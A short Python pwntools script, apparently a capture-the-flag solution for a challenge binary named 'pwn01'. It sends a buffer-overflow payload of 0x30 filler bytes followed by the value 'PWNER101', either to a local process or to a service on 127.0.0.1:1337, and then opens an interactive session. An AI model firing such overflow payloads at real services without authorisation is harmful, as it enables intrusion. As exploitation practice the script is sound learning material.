from pwn import *
import time
import sys

def pwn01(DEBUG):
	if DEBUG=="1":
		r = process("./pwn01")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '127.0.0.1'
		PORT = 1337
		r = remote(HOST,PORT)
	
	r.recvuntil("Input: ")
	payload = "A"*0x30
	payload += "PWNER101"
	r.sendline(payload)
	
	r.interactive()

pwn01(sys.argv[1])